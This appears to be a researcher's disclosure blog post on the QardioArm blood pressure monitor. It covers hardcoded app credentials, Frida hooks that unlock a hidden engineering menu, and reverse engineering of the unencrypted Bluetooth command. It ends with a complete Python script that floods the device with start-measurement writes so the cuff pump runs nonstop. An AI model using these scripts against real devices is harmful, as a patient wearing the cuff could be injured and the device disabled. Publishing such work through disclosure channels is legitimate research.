---
layout: post
title: Reversing the QardioArm
---
![Untitled](/assets/blinko-001.png)

This is a two-part blog post disclosing the first set of CVEs *(CVE-2025-20615, CVE-2025-23421, and CVE-2025-24836)* for the QardioArm, a wireless blood pressure monitor. I was first interested in the device because of its hardware, which I will discuss in another blog post. 

### Part 0x1 - Exposed Credentials

The mobile application was simple. You create a username and password and login to the application to begin pairing and using the QardioArm device. Though you can do the same for any of their mobile app-supported devices.

I started by decrypting and pulling the IPA onto my laptop. My main goal was to see what juicy information I could find inside the compiled application. To my surprise, there was a plist file with more than one set of production-level credentials. I will leave that exercise to the reader…

After finding this plist file I incrementally logged into each set of credentials. One set exposed an interesting Menu option. I found that an engineering panel was present in the App Route. This was found in the `Qardio.AppRoutes` class and initialized the `-[Engineering init]` process that could be used to access the engineering menu. 

This menu allowed for the user to send commands to the QardioArm device via the mobile application. Seems like a feature that was not intended to be in a production application. Using [mrmacete’s](https://x.com/bezjaje) objc-method-observer [script](https://www.notion.so/Reversing-the-Qardio-ARM-188d977325a9804fa647fe83f5cffa85?pvs=21). I was able to trace the initialization process of this object. 

```python
(0x28149ba40)  -[EngineeringMenuItem init]
0x104842258 /private/var/containers/Bundle/Application/8E2673E8-69F9-48B3-8831-63E86B546B47/Qardio.app/Qardio!+[MenuItem menuItem]
0x10482ca40 /private/var/containers/Bundle/Application/8E2673E8-69F9-48B3-8831-63E86B546B47/Qardio.app/Qardio!-[MenuCollectionViewDataSource items]
0x10482c6d8 /private/var/containers/Bundle/Application/8E2673E8-69F9-48B3-8831-63E86B546B47/Qardio.app/Qardio!-[MenuCollectionViewDataSource loadItems]
0x1048a5124 /private/var/containers/Bundle/Application/8E2673E8-69F9-48B3-8831-63E86B546B47/Qardio.app/Qardio!-[MenuCollectionViewController showMenu]
0x1048e27fc /private/var/containers/Bundle/Application/8E2673E8-69F9-48B3-8831-63E86B546B47/Qardio.app/Qardio!-[QardioMenuViewController viewDidAppear:]
0x1a02276c0 UIKitCore!-[UIViewController _setViewAppearState:isAnimating:]
0x1a04224e8 UIKitCore!-[UIViewController __viewDidAppear:]
0x1a0228f18 UIKitCore!-[UINavigationController viewDidAppear:]
0x1a02276c0 UIKitCore!-[UIViewController _setViewAppearState:isAnimating:]
0x1a04224e8 UIKitCore!-[UIViewController __viewDidAppear:]
0x1a0422394 UIKitCore!-[UIViewController _endAppearanceTransition:]
0x1a0421d44 UIKitCore!__48-[UIPresentationController transitionDidFinish:]_block_invoke
0x1a03a8558 UIKitCore!-[_UIAfterCACommitBlock run]
0x1a03a8494 UIKitCore!-[_UIAfterCACommitQueue flush]
0x1a03a8398 UIKitCore!_runAfterCACommitDeferredBlocks
0x1a02569a4 UIKitCore!_cleanUpAfterCAFlushAndRunDeferredBlocks
RET: <EngineeringMenuItem: 0x28149ba40>
```

In iOS the responsible class method is `+[MenuCollectionViewDataSource items]`. You can use the script to add the EngineeringMenuItem. A QardioArm device needs to be paired to send commands over the console.

```swift
if (ObjC.available) {
    Interceptor.attach(ObjC.classes.MenuCollectionViewDataSource["- items"].implementation, {
        onLeave(retval) {
            try {
                let items = ObjC.Object(retval);
                let mutableItems = ObjC.classes.NSMutableArray.alloc().initWithArray_(items);
                mutableItems.addObject_(ObjC.classes.EngineeringMenuItem.alloc().init());
                retval.replace(mutableItems);
            } catch (e) {
                console.log("[!] Error: " + e);
            }
        }
    });
}
```

In Android, the responsible class is `com.getqardio.android.mvp.MvpApplication` and the boolean type `c0` needs to be changed to true. It took a lot of poking and prodding in jadx-gui to find the right boolean value. You can use the following Frida script to enable the engineering console with any user.  

```swift
Java.perform(function() {
    var MvpApplication = Java.use("com.getqardio.android.mvp.MvpApplication");

    MvpApplication.c0.implementation = function() {
        console.log("[*] Overriding c0() to return TRUE");
        return true;
    };
});
```

![Untitled](/assets/qardioAndroid.png)

### Part 0x2 - Chars and CMDs

Onto reversing the unencrypted Bluetooth connection with the QardioArm device. This device uses a small microcontroller powered by four AAA batteries to engage a small pump and start the blood pressure measurement process. If you are interested in the general schematics of the device you can find all internal details on the FCC website. I may dump the microcontroller firmware on my GitHub at a later point for anyone interested. 

Each start measurement command is sent over a Bluetooth connection to the mobile application. The results are displayed in the application dashboard, showing the patient's corresponding values to the clinician. 

My next goal was to obtain the UUID identified for the BLE characteristic, the property assigned to the characteristic, and the value of the characteristic length. iOS uses the [CBCharacteristic](https://developer.apple.com/documentation/corebluetooth/cbcharacteristic) class to send commands over Bluetooth. So using a custom Frida script I traced the value of each and began the reversing process. Using my script I was able to observe the following output when connecting the QardioArm device and starting a command:

```swift
[*] Writing value to characteristic: <CBCharacteristic: 0x280e95bc0, UUID = 583CB5B3-875D-40ED-9098-C39EB0C1983D, properties = 0x18, value = (null), notifying = NO> Value: {length = 2, bytes = 0xf101} Type: 0x0
[*] Writing value to characteristic: <CBCharacteristic: 0x280e95bc0, UUID = 583CB5B3-875D-40ED-9098-C39EB0C1983D, properties = 0x18, value = (null), notifying = NO> Value: {length = 2, bytes = 0xf102} Type: 0x0
```

Based on this information:

- The UUID `583CB5B3-875D-40ED-9098-C39EB0C1983D` is the identifier for the BLE characteristic that the data is being written to.
- The value of the data written to the characteristic is of `{length = 2, bytes = 0xf101}` the data is `0xF101`.

For sanity grepping for this UUID in the compiled application binary or using Hopper we can observe the following:

```swift
❯ strings Qardio | grep -i 583CB5B3-875D-40ED-9098-C39EB0C1983D -A 10 -B 10
EnvelopeTransmissionFailureRangeStartKey
EnvelopeTransmissionFailureRangeEndKey
EnvelopeTransmissionFailureRealtimeKey
kBLEServiceBluetoothPowerChanged
powerIsOn
com.getqardio.blequeue
v32@?0@"NSString"8@"<BLEService>"16^B24
QardioARM
QardioARM 2
1810
583CB5B3-875D-40ED-9098-C39EB0C1983D
712F0003-6CE1-4447-994C-D85E078F6BF5
2A35
23810
v32@?0@"NSString"8@"NSDate"16^B24
%d%d%d
QardioCoreDeviceStateKey
/Users/########/Documents/work/qardio-ios/QardioBLE/CBPeripheral+CoreServiceRequests.m
-[CBPeripheral(CoreServiceRequests) qd_requestMissedEnvelopes:oldestEnvelope:nextEnvelope:]
CoreServiceCharacteristcs: ERROR! This is really too bad, iOS lost data, lastStored < oldestEnvelope
CoreServiceCharacteristcs: ERROR! Something has gone terribly wrong, lastStored > nextEnvelope.
```

Hopper has a direct string cross-reference in the following class `BPDService`:

```swift
___CFConstantStringClassReference, 0x7c8, a583cb5b3875d40, 0x24 ; "583CB5B3-875D-40ED-9098-C39EB0C1983D", DATA XREF=-[BPDService peripheral:didDiscoverCharacteristicsForService:error:]+612, -[BPDService peripheral:didUpdateValueForCharacteristic:error:]+2720
```

On the Android side you can see the following value in the `BleBPDataProvider` class:

```swift
    static {
        UUID fromString = UUID.fromString("00001810-0000-1000-8000-00805f9b34fb");
        ex1.i(fromString, "fromString(\"00001810-0000-1000-8000-00805f9b34fb\")");
        j = fromString;
        UUID fromString2 = UUID.fromString("00002a35-0000-1000-8000-00805f9b34fb");
        ex1.i(fromString2, "fromString(\"00002a35-0000-1000-8000-00805f9b34fb\")");
        k = fromString2;
        UUID fromString3 = UUID.fromString("00002a26-0000-1000-8000-00805f9b34fb");
        ex1.i(fromString3, "fromString(\"00002a26-0000-1000-8000-00805f9b34fb\")");
        l = fromString3;
        UUID fromString4 = UUID.fromString("00002a28-0000-1000-8000-00805f9b34fb");
        ex1.i(fromString4, "fromString(\"00002a28-0000-1000-8000-00805f9b34fb\")");
        m = fromString4;
        n = UUID.fromString("583CB5B3-875D-40ED-9098-C39EB0C1983D");
        o = UUID.fromString("00001810-0000-1000-8000-00805f9b34fb");
    }
```

Next, after reversing the command's value and the proper UUID, my main task was to create an automation script and then send a `startMeasurement` command.

### Part 0x3 - Custom Scripting

Below is the custom script I wrote, which checks for the device name, connects to the UUID, and sends the write command `f101` 20000 times. This floods the device and forces it to run the motor continuously. 

[Video](https://youtu.be/y3s-3RQ-J2A) POC.

```swift
import asyncio
import logging
from bleak import BleakScanner, BleakClient

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

DEVICE_NAME = "QardioARM"
CHAR_UUID = "583cb5b3-875d-40ed-9098-c39eb0c1983d"
DATA_TO_WRITE = bytes.fromhex('f101')  # Ensure correct format

async def connect_and_write():
    logger.info("Scanning for devices...")
    devices = await BleakScanner.discover()

    device = next((dev for dev in devices if dev.name == DEVICE_NAME), None)
    if not device:
        logger.error(f"Device named {DEVICE_NAME} not found.")
        return

    async with BleakClient(device.address) as client:
        await client.connect()
        logger.info(f"Connected to {DEVICE_NAME}. Writing data to characteristic...")

        # Loop to write data 20000 times
        for i in range(20000):
            await client.write_gatt_char(CHAR_UUID, DATA_TO_WRITE, response=True)
            logger.info(f"Data written successfully {i+1} times. Waiting for device to process...")
            await asyncio.sleep(0.5)  # Delay to avoid overwhelming the device

        logger.info("Completed all write operations. Disconnecting...")

# Run the async function
asyncio.run(connect_and_write())
```

### Conclusion

Overall the disclosure timeline for these CVEs took about 5+ months. Thanks to VINCE and CISA for helping publish the details. The vendor, Qardio was ultimately unresponsive, I even tried reaching out to one of their developers over LinkedIn. They informed me the company is now bankrupt.

In the next blog post, I will discuss analyzing the static bin file from the mobile application and flashing the firmware to an ESP32-C3 dev board.
